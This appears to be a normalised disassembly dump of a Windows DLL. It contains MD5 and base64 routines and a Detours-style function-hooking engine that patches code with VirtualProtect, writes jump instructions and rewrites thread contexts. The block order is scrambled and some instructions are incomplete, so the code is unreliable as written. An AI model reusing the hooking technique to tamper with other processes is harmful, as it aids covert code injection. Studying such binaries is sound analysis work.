shl ebx 0x9
or edx ebx
add edx edi
mov ebx edx
xor ebx edi
and ebx ecx
xor ebx edi
add ebx [ ebp - 0x14 ]
lea esi [ esi + ebx + 0x265e5a51 ]
mov ebx esi
shr ebx 0x12
shl esi 0xe
or ebx esi
mov esi edx
add ebx edx
xor esi ebx
and esi edi
xor esi edx
add esi [ ebp - 0x40 ]
lea ecx [ ecx + esi - 0x16493856 ]
mov esi ecx
shl esi 0x14
shr ecx 0xc
or esi ecx
mov ecx ebx
add esi ebx
xor ecx esi
and ecx edx
xor ecx ebx
add ecx [ ebp - 0x2c ]
lea edi [ edi + ecx - 0x29d0efa3 ]
mov ecx edi
shr ecx 0x1b
shl edi 0x5
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi ebx
xor edi esi
add edi [ ebp - 0x18 ]
lea edx [ edx + edi + 0x2441453 ]
mov edi edx
shr edi 0x17
shl edx 0x9
or edi edx
add edi ecx
mov edx edi
xor edx ecx
and edx esi
xor edx ecx
add edx [ ebp - 0x4 ]
lea ebx [ ebx + edx - 0x275e197f ]
mov edx ebx
shr edx 0x12
shl ebx 0xe
or edx ebx
mov ebx edi
add edx edi
xor ebx edx
and ebx ecx
xor ebx edi
add ebx [ ebp - 0x30 ]
lea esi [ esi + ebx - 0x182c0438 ]
mov ebx esi
shl ebx 0x14
shr esi 0xc
or ebx esi
mov esi edx
add ebx edx
xor esi ebx
and esi edi
xor esi edx
add esi [ ebp - 0x1c ]
lea ecx [ ecx + esi + 0x21e1cde6 ]
mov esi ecx
shr esi 0x1b
shl ecx 0x5
or esi ecx
mov ecx ebx
add esi ebx
xor ecx esi
and ecx edx
xor ecx ebx
add ecx [ ebp - 0x8 ]
lea edi [ edi + ecx - 0x3cc8f82a ]
mov ecx edi
shr ecx 0x17
shl edi 0x9
or ecx edi
add ecx esi
mov edi ecx
xor edi esi
and edi ebx
xor edi esi
add edi [ ebp - 0x34 ]
lea edx [ edx + edi - 0xb2af279 ]
mov edi edx
shr edi 0x12
shl edx 0xe
or edi edx
mov edx ecx
add edi ecx
xor edx edi
and edx esi
xor edx ecx
add edx [ ebp - 0x20 ]
lea ebx [ ebx + edx + 0x455a14ed ]
mov edx ebx
shl edx 0x14
shr ebx 0xc
or edx ebx
mov ebx edi
add edx edi
xor ebx edx
and ebx ecx
xor ebx edi
add ebx [ ebp - 0xc ]
lea esi [ esi + ebx - 0x561c16fb ]
mov ebx esi
shr ebx 0x1b
shl esi 0x5
or ebx esi
mov esi edx
add ebx edx
xor esi ebx
and esi edi
xor esi edx
add esi [ ebp - 0x38 ]
lea ecx [ ecx + esi - 0x3105c08 ]
mov esi ecx
shr esi 0x17
shl ecx 0x9
or esi ecx
add esi ebx
mov ecx esi
mov [ ebp + 0xc ] esi
xor ecx ebx
and ecx edx
xor ecx ebx
add ecx [ ebp - 0x24 ]
lea ecx [ edi + ecx + 0x676f02d9 ]
mov edi ecx
shr edi 0x12
shl ecx 0xe
or edi ecx
add edi esi
xor [ ebp + 0xc ] edi
mov ecx [ ebp + 0xc ]
and ecx ebx
xor ecx esi
add ecx [ ebp - 0x10 ]
lea edx [ edx + ecx - 0x72d5b376 ]
mov ecx edx
shl ecx 0x14
shr edx 0xc
or ecx edx
mov edx [ ebp + 0xc ]
add ecx edi
xor edx ecx
add edx [ ebp - 0x2c ]
lea ebx [ ebx + edx - 0x5c6be ]
mov edx ebx
shr edx 0x1c
shl ebx 0x4
or edx ebx
mov ebx edi
add edx ecx
xor ebx ecx
xor ebx edx
add ebx [ ebp - 0x20 ]
lea esi [ esi + ebx - 0x788e097f ]
mov ebx esi
shr ebx 0x15
shl esi 0xb
or ebx esi
add ebx edx
mov esi ebx
mov [ ebp + 0xc ] ebx
xor esi ecx
xor esi edx
add esi [ ebp - 0x14 ]
lea edi [ edi + esi + 0x6d9d6122 ]
mov esi edi
shr esi 0x10
shl edi 0x10
or esi edi
add esi ebx
xor [ ebp + 0xc ] esi
mov edi [ ebp + 0xc ]
xor edi edx
add edi [ ebp - 0x8 ]
lea edi [ ecx + edi - 0x21ac7f4 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ ebp + 0xc ]
add ecx esi
xor edi ecx
add edi [ ebp - 0x3c ]
lea edi [ edx + edi - 0x5b4115bc ]
mov edx edi
shr edx 0x1c
shl edi 0x4
or edx edi
mov edi esi
add edx ecx
xor edi ecx
xor edi edx
add edi [ ebp - 0x30 ]
lea ebx [ ebx + edi + 0x4bdecfa9 ]
mov edi ebx
shr edi 0x15
shl ebx 0xb
or edi ebx
add edi edx
mov ebx edi
mov [ ebp + 0xc ] edi
xor ebx ecx
xor ebx edx
add ebx [ ebp - 0x24 ]
lea esi [ esi + ebx - 0x944b4a0 ]
mov ebx esi
shr ebx 0x10
shl esi 0x10
or ebx esi
add ebx edi
xor [ ebp + 0xc ] ebx
mov esi [ ebp + 0xc ]
xor esi edx
add esi [ ebp - 0x18 ]
lea esi [ ecx + esi - 0x41404390 ]
mov ecx esi
shl ecx 0x17
shr esi 0x9
or ecx esi
mov esi [ ebp + 0xc ]
add ecx ebx
xor esi ecx
add esi [ ebp - 0xc ]
lea esi [ edx + esi + 0x289b7ec6 ]
mov edx esi
shr edx 0x1c
shl esi 0x4
or edx esi
mov esi ebx
add edx ecx
xor esi ecx
xor esi edx
add esi [ ebp - 0x40 ]
lea edi [ edi + esi - 0x155ed806 ]
mov esi edi
shr esi 0x15
shl edi 0xb
or esi edi
add esi edx
mov edi esi
mov [ ebp + 0xc ] esi
xor edi ecx
xor edi edx
add edi [ ebp - 0x34 ]
lea ebx [ ebx + edi - 0x2b10cf7b ]
mov edi ebx
shr edi 0x10
shl ebx 0x10
or edi ebx
add edi esi
xor [ ebp + 0xc ] edi
mov ebx [ ebp + 0xc ]
xor ebx edx
add ebx [ ebp - 0x28 ]
lea ebx [ ecx + ebx + 0x4881d05 ]
mov ecx ebx
shl ecx 0x17
shr ebx 0x9
or ecx ebx
mov ebx [ ebp + 0xc ]
add ecx edi
xor ebx ecx
add ebx [ ebp - 0x1c ]
lea ebx [ edx + ebx - 0x262b2fc7 ]
mov edx ebx
shr edx 0x1c
shl ebx 0x4
or edx ebx
mov ebx edi
xor ebx ecx
add edx ecx
xor ebx edx
add ebx [ ebp - 0x10 ]
lea ebx [ esi + ebx - 0x1924661b ]
mov esi ebx
shr esi 0x15
shl ebx 0xb
or esi ebx
add esi edx
mov ebx esi
xor ebx ecx
xor ebx edx
add ebx [ ebp - 0x4 ]
lea ebx [ edi + ebx + 0x1fa27cf8 ]
mov edi ebx
shr edi 0x10
shl ebx 0x10
or edi ebx
mov ebx esi
add edi esi
xor ebx edi
xor ebx edx
add ebx [ ebp - 0x38 ]
lea ecx [ ecx + ebx - 0x3b53a99b ]
mov ebx ecx
shl ebx 0x17
shr ecx 0x9
or ebx ecx
mov ecx esi
add ebx edi
not ecx
or ecx ebx
xor ecx edi
add ecx [ ebp - 0x40 ]
lea edx [ edx + ecx - 0xbd6ddbc ]
mov ecx edx
shr ecx 0x1a
shl edx 0x6
or ecx edx
mov edx edi
add ecx ebx
not edx
or edx ecx
xor edx ebx
add edx [ ebp - 0x24 ]
lea esi [ esi + edx + 0x432aff97 ]
mov edx esi
shr edx 0x16
shl esi 0xa
or edx esi
mov esi ebx
add edx ecx
not esi
or esi edx
xor esi ecx
add esi [ ebp - 0x8 ]
lea edi [ edi + esi - 0x546bdc59 ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov edi ecx
add esi edx
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x2c ]
lea ebx [ ebx + edi - 0x36c5fc7 ]
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
add edi esi
mov ebx edx
not ebx
or ebx edi
xor ebx esi
add ebx [ ebp - 0x10 ]
lea ebx [ ecx + ebx + 0x655b59c3 ]
mov ecx ebx
shl ebx 0x6
shr ecx 0x1a
or ecx ebx
mov ebx esi
not ebx
add ecx edi
or ebx ecx
xor ebx edi
add ebx [ ebp - 0x34 ]
lea ebx [ edx + ebx - 0x70f3336e ]
mov edx ebx
shl ebx 0xa
shr edx 0x16
or edx ebx
mov ebx edi
not ebx
add edx ecx
or ebx edx
xor ebx ecx
add ebx [ ebp - 0x18 ]
lea ebx [ esi + ebx - 0x100b83 ]
mov esi ebx
shl ebx 0xf
shr esi 0x11
or esi ebx
mov ebx ecx
add esi edx
not ebx
or ebx esi
xor ebx edx
add ebx [ ebp - 0x3c ]
lea ebx [ edi + ebx - 0x7a7ba22f ]
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
mov ebx edx
add edi esi
not ebx
or ebx edi
xor ebx esi
add ebx [ ebp - 0x20 ]
lea ebx [ ecx + ebx + 0x6fa87e4f ]
mov ecx ebx
shr ecx 0x1a
shl ebx 0x6
or ecx ebx
mov ebx esi
add ecx edi
not ebx
or ebx ecx
xor ebx edi
add ebx [ ebp - 0x4 ]
lea ebx [ edx + ebx - 0x1d31920 ]
mov edx ebx
shr edx 0x16
shl ebx 0xa
or edx ebx
mov ebx edi
add edx ecx
not ebx
or ebx edx
xor ebx ecx
add ebx [ ebp - 0x28 ]
lea ebx [ esi + ebx - 0x5cfebcec ]
mov esi ebx
shr esi 0x11
shl ebx 0xf
or esi ebx
mov ebx ecx
add esi edx
not ebx
or ebx esi
xor ebx edx
add ebx [ ebp - 0xc ]
lea ebx [ edi + ebx + 0x4e0811a1 ]
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
mov ebx edx
add edi esi
not ebx
or ebx edi
xor ebx esi
add ebx [ ebp - 0x30 ]
lea ebx [ ecx + ebx - 0x8ac817e ]
mov ecx ebx
shr ecx 0x1a
shl ebx 0x6
or ecx ebx
mov ebx esi
add ecx edi
not ebx
or ebx ecx
xor ebx edi
add ebx [ ebp - 0x14 ]
lea edx [ edx + ebx - 0x42c50dcb ]
mov ebx edx
shr ebx 0x16
shl edx 0xa
or ebx edx
mov edx edi
add ebx ecx
not edx
or edx ebx
xor edx ecx
add edx [ ebp - 0x38 ]
lea esi [ esi + edx + 0x2ad7d2bb ]
mov edx esi
shr edx 0x11
shl esi 0xf
or edx esi
mov esi ecx
add edx ebx
not esi
or esi edx
xor esi ebx
add esi [ ebp - 0x1c ]
lea edi [ edi + esi - 0x14792c6f ]
mov esi [ eax ]
add esi ecx
mov ecx edi
shl ecx 0x15
shr edi 0xb
or ecx edi
mov [ eax ] esi
add ecx [ eax + 0x4 ]
pop edi
pop esi
add ecx edx
mov [ eax + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
add edx ecx
mov ecx [ eax + 0xc ]
add ebx ecx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] ebx
pop ebx
leave
retn
sub_100027d4
push esi
mov esi [ esp + 0xc ]
mov eax esi
push edi
shl eax 0x2
push 0x3
cdq
pop ecx
idiv ecx
add eax 0x4
push eax
call malloc
mov edi eax
push edi
push esi
push [ esp + 0x18 ]
call sub_10002803
add esp 0x10
mov eax edi
pop edi
pop esi
retn
sub_10002803
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0x3
pop edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor edx edx
mov ecx edi
push ebx
div ecx
mov ecx eax
imul ecx ecx 0xfffffffd
add [ ebp + 0xc ] ecx
mov ecx [ ebp + 0x8 ]
and [ esi ] 0x0
mov eax esi
sub eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebp
retn
movzx eax [ ecx ]
mov edx [ rw-data ]
shr eax 0x2
cmp [ ebp + 0xc ] 0x1
mov al [ eax + edx ]
mov [ esi ] al
mov al [ ecx ]
jne r-xdata
movzx edx [ ecx ]
mov ebx [ rw-data ]
shr edx 0x2
mov dl [ edx + ebx ]
mov [ esi ] dl
mov dl [ ecx ]
movzx ebx [ ecx + 0x1 ]
and edx edi
add esi 0x4
shl edx 0x4
shr ebx 0x4
or edx ebx
mov ebx [ rw-data ]
mov dl [ edx + ebx ]
mov [ esi - 0x3 ] dl
mov dl [ ecx + 0x1 ]
movzx ebx [ ecx + 0x2 ]
and edx 0xf
shl edx 0x2
shr ebx 0x6
or edx ebx
mov ebx [ rw-data ]
mov dl [ edx + ebx ]
mov [ esi - 0x2 ] dl
mov dl [ ecx + 0x2 ]
mov ebx [ rw-data ]
and edx 0x3f
add ecx edi
dec eax
mov dl [ edx + ebx ]
mov [ esi - 0x1 ] dl
jne r-xdata
pop ebx
jmp r-xdata
movzx edx [ ecx + 0x1 ]
and eax edi
shl eax 0x4
shr edx 0x4
or eax edx
mov edx [ rw-data ]
mov al [ eax + edx ]
mov [ esi + 0x1 ] al
mov al [ ecx + 0x1 ]
mov ecx [ rw-data ]
and eax 0xf
mov al [ ecx + eax * 4 ]
mov [ esi + 0x2 ] al
mov ecx [ rw-data ]
and eax edi
shl eax 0x4
mov al [ eax + ecx ]
mov [ esi + 0x2 ] 0x3d
mov [ esi + 0x1 ] al
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ esi + 0x3 ] 0x3d
add esi 0x4
sub_10002970
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_100029b2
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_100029b2
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_100010d9
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_100029b2
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_100029b2
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10002b18
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esi ]
cmp al 0xff
jne r-xdata
and [ eax ] 0x0
pop edi
pop esi
retn
cmp al 0xeb
jne r-xdata
cmp [ esi + 0x1 ] 0x25
jne r-xdata
mov eax esi
movsx eax [ esi + 0x1 ]
cmp [ eax + esi + 0x2 ] 0xe9
lea eax [ eax + esi + 0x2 ]
jne r-xdata
mov edi [ esi + 0x2 ]
push edi
push esi
call sub_10002b6e
pop ecx
test al al
pop ecx
je r-xdata
add eax [ eax + 0x1 ]
jmp r-xdata
mov eax [ edi ]
jmp r-xdata
sub_10002b6e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push 0x1c
lea eax [ ebp - 0x34 ]
push eax
push [ ebp + 0x8 ]
call [ VirtualQuery@IAT ]
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x38 ] ecx
cmp [ ecx ] 0x5a4d
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor al al
mov eax [ ecx + 0x3c ]
add eax ecx
mov [ ebp - 0x3c ] eax
cmp [ eax ] 0x4550
je r-xdata
mov edx [ eax + 0xd8 ]
lea esi [ edx + ecx ]
cmp [ ebp + 0xc ] esi
jb r-xdata
xor al al
mov eax [ eax + 0xdc ]
add eax edx
add eax ecx
cmp [ ebp + 0xc ] eax
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov al 0x1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_10002c09
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x10dd
pop esi
retn
call [ GetCurrentThreadId@IAT ]
push esi
push eax
push rw-data
call [ InterlockedCompareExchange@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_10002c59
xor eax eax
pop esi
retn
sub_10002c59
push ecx
push esi
mov esi [ rw-data ]
pop esi
pop ecx
retn
lea eax [ esp + 0x4 ]
push eax
push 0x40
push 0x10000
push esi
call [ VirtualProtect@IAT ]
mov esi [ esi + 0x4 ]
jmp r-xdata
test esi esi
je r-xdata
sub_10002c80
push ecx
call [ GetCurrentThreadId@IAT ]
cmp [ rw-data ] eax
je r-xdata
push ebx
push esi
mov esi [ rw-data ]
xor ebx ebx
cmp esi ebx
push edi
je r-xdata
mov eax 0x10dd
pop ecx
retn
mov [ rw-data ] ebx
call sub_10002d23
mov esi [ rw-data ]
cmp esi ebx
je r-xdata
lea eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x10 ]
push [ esi + 0x14 ]
movzx eax [ eax + 0x17 ]
push eax
push [ esi + 0xc ]
call [ VirtualProtect@IAT ]
cmp [ esi + 0x4 ] ebx
jne r-xdata
pop edi
mov [ rw-data ] ebx
mov [ rw-data ] ebx
pop esi
xor eax eax
pop ebx
pop ecx
retn
push [ esi + 0x4 ]
call [ ResumeThread@IAT ]
mov edi [ esi ]
push esi
call ??3@YAXPAX@Z
cmp edi ebx
pop ecx
mov esi edi
jne r-xdata
mov edi [ esi ]
push esi
call ??3@YAXPAX@Z
cmp edi ebx
pop ecx
mov esi edi
jne r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
push eax
call sub_10002d4a
pop ecx
mov [ esi + 0x10 ] ebx
sub_10002d23
push ecx
push esi
mov esi [ rw-data ]
pop esi
pop ecx
retn
lea eax [ esp + 0x4 ]
push eax
push 0x20
push 0x10000
push esi
call [ VirtualProtect@IAT ]
mov esi [ esi + 0x4 ]
jmp r-xdata
test esi esi
je r-xdata
sub_10002d4a
push esi
push edi
mov edi [ esp + 0xc ]
push 0x20
mov esi edi
push 0x0
push edi
and si 0x0
call memset
mov eax [ esi + 0x8 ]
add esp 0xc
mov [ edi + 0x18 ] eax
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn
sub_10002d77
push ebp
mov ebp esp
sub esp 0x2d4
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
call [ GetCurrentThreadId@IAT ]
cmp [ rw-data ] eax
je r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
cmp [ rw-data ] ebx
je r-xdata
mov eax 0x10dd
jmp r-xdata
push esi
mov esi [ rw-data ]
push edi
call sub_10002c80
jmp r-xdata
pop ebx
leave
retn 0x4
mov edi [ rw-data ]
cmp edi ebx
je r-xdata
cmp [ esi + 0x4 ] ebx
mov eax [ esi + 0x10 ]
je r-xdata
mov eax [ rw-data ]
call [ GetCurrentProcess@IAT ]
mov esi [ rw-data ]
mov [ ebp - 0x4 ] eax
cmp esi ebx
je r-xdata
mov ebx [ SetThreadContext@IAT ]
mov ecx [ eax + 0x1c ]
mov eax [ esi + 0xc ]
lea edx [ eax + 0x5 ]
mov [ eax ] 0xe9
inc eax
sub ecx edx
mov [ eax ] ecx
mov ecx [ esi + 0x10 ]
lea edi [ eax + 0x4 ]
mov ecx [ ecx + 0x18 ]
cmp edi ecx
jae r-xdata
xor edi edi
cmp [ eax + 0x17 ] 0x0
jbe r-xdata
mov [ rw-data ] ebx
call sub_10002d23
mov esi [ rw-data ]
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ esi + 0x10 ]
push [ esi + 0x14 ]
movzx eax [ eax + 0x17 ]
push eax
push [ esi + 0xc ]
call [ VirtualProtect@IAT ]
mov eax [ esi + 0x10 ]
movzx eax [ eax + 0x17 ]
push eax
push [ esi + 0xc ]
push [ ebp - 0x4 ]
call [ FlushInstructionCache@IAT ]
cmp [ esi + 0x4 ] ebx
je r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
mov esi [ rw-data ]
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
sub ecx edi
mov eax 0xcccccccc
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ esi + 0x10 ]
movzx eax [ eax + 0x17 ]
cmp edi eax
je r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push ecx
push ebx
push eax
mov eax [ esi + 0xc ]
add eax edi
push eax
call sub_10003f02
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
cmp eax ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
pop esi
je r-xdata
push [ esi + 0x4 ]
call [ ResumeThread@IAT ]
mov edi [ esi ]
push esi
call ??3@YAXPAX@Z
cmp edi ebx
pop ecx
mov esi edi
jne r-xdata
mov edi [ esi ]
push esi
call ??3@YAXPAX@Z
cmp edi ebx
pop ecx
mov esi edi
jne r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x2d4 ]
mov [ ebp - 0x2d4 ] 0x10001
push eax
push [ edi + 0x4 ]
call [ GetThreadContext@IAT ]
test eax eax
je r-xdata
xor ebx ebx
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp esi ebx
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0xc ]
jmp r-xdata
mov [ rw-data ] 0xd
mov eax [ esi + 0x8 ]
mov [ rw-data ] eax
mov ecx [ esi + 0x10 ]
mov edi eax
sub edi ecx
movzx ecx [ ecx + 0x17 ]
cmp edi ecx
jl r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
push eax
call sub_10002d4a
pop ecx
mov [ esi + 0x10 ] ebx
mov eax [ esi + 0xc ]
cmp [ ebp - 0x21c ] eax
jb r-xdata
mov eax [ esi + 0x10 ]
cmp [ ebp - 0x21c ] eax
jb r-xdata
mov [ eax ] ecx
mov esi [ esi ]
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov ecx [ esi + 0x10 ]
movzx ecx [ ecx + 0x17 ]
add ecx eax
cmp [ ebp - 0x21c ] ecx
jae r-xdata
lea ecx [ eax + 0x4 ]
cmp [ ebp - 0x21c ] ecx
jae r-xdata
test esi esi
je r-xdata
sub [ ebp - 0x21c ] eax
mov eax [ esi + 0x10 ]
sub [ ebp - 0x21c ] eax
mov eax [ esi + 0xc ]
jmp r-xdata
add [ ebp - 0x21c ] eax
lea eax [ ebp - 0x2d4 ]
push eax
push [ edi + 0x4 ]
call ebx
sub_10002fcd
mov eax [ rw-data ]
push esi
test eax eax
push edi
jne r-xdata
pop edi
pop esi
retn 0x4
call [ GetCurrentThread@IAT ]
mov edi [ esp + 0xc ]
cmp edi eax
je r-xdata
xor eax eax
push 0x8
call ??2@YAPAXI@Z
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SuspendThread@IAT ]
cmp eax 0xffffffff
jne r-xdata
push 0x8
pop edi
jmp r-xdata
mov [ esi + 0x4 ] edi
mov eax [ rw-data ]
mov [ esi ] eax
mov [ rw-data ] esi
call [ GetLastError@IAT ]
push esi
mov edi eax
call ??3@YAXPAX@Z
pop ecx
and [ rw-data ] 0x0
mov [ rw-data ] edi
mov eax edi
jmp r-xdata
sub_10003051
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
cmp eax esi
push edi
mov [ ebp - 0x4 ] esi
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax esi
je r-xdata
mov [ eax ] esi
mov ebx [ ebp + 0x18 ]
cmp ebx esi
je r-xdata
mov [ eax ] esi
call [ GetCurrentThreadId@IAT ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebx ] esi
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
mov eax 0x10dd
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
mov ecx [ ebp + 0x8 ]
cmp ecx esi
jne r-xdata
mov eax [ ecx ]
cmp eax esi
jne r-xdata
push 0x6
pop eax
jmp r-xdata
push esi
push eax
mov [ ebp + 0x18 ] esi
call sub_10002b06
push 0x0
mov edi eax
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
call sub_10002b06
cmp eax edi
mov [ ebp + 0xc ] eax
jne r-xdata
push 0x6
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ecx
jmp r-xdata
test ebx ebx
je r-xdata
mov [ ecx ] edi
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
jmp r-xdata
push 0x18
call ??2@YAPAXI@Z
test eax eax
pop ecx
mov [ ebp + 0x18 ] eax
jne r-xdata
mov [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
push edi
call sub_100032f4
mov esi eax
pop ecx
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push esi
call sub_10002d4a
pop ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
call ??3@YAXPAX@Z
pop ecx
mov eax edi
xor ebx ebx
jmp r-xdata
mov [ eax ] esi
and [ ebp + 0x14 ] 0x0
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
mov [ ebp - 0x4 ] eax
push eax
lea eax [ ebx + esi ]
push eax
call sub_10003f02
cmp [ ebp + 0x14 ] 0x0
mov [ ebp + 0x10 ] eax
jne r-xdata
cmp ebx 0x5
jge r-xdata
push [ ebp - 0x4 ]
mov ebx eax
sub ebx edi
call sub_100032a5
test eax eax
pop ecx
jne r-xdata
cmp ebx 0x12
jbe r-xdata
cmp [ rw-data ] 0x0
mov [ ebp - 0x4 ] 0x9
jne r-xdata
cmp ebx 0x5
jl r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0x17 ]
mov [ esi + 0x1c ] eax
lea edx [ ebx + edi ]
lea eax [ ebx + esi ]
mov [ esi + 0x18 ] edx
mov [ ecx ] bl
lea edi [ eax + 0x5 ]
mov [ eax ] 0xe9
inc eax
sub edx edi
lea edi [ eax + 0x4 ]
mov [ eax ] edx
cmp edi ecx
jae r-xdata
mov [ ebp - 0x4 ] 0x6
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0x18 ]
and [ ebp - 0xc ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x40
push ebx
push [ ebp - 0x8 ]
call [ VirtualProtect@IAT ]
test eax eax
je r-xdata
sub ecx edi
mov eax 0xcccccccc
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
push [ ebp - 0x8 ]
call sub_100034eb
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
and [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ edi + 0x10 ] esi
mov [ edi + 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ edi + 0x14 ] eax
mov eax [ rw-data ]
mov [ edi ] eax
mov [ rw-data ] edi
xor eax eax
cmp [ ebx + 0x1c ] 0x6544
je r-xdata
and [ ebp + 0xc ] 0x0
lea eax [ ebp + 0xc ]
push eax
push 0x40
push 0x40
push ebx
call [ VirtualProtect@IAT ]
test eax eax
jne r-xdata
mov [ ebx + 0x1c ] 0x6544
mov [ ebx + 0x1e ] 0x6f74
mov [ ebx + 0x20 ] 0x7275
mov [ ebx + 0x22 ] 0x2173
sub_100032a5
mov ecx [ esp + 0x4 ]
mov al [ ecx ]
cmp al 0xe9
je r-xdata
push 0x1
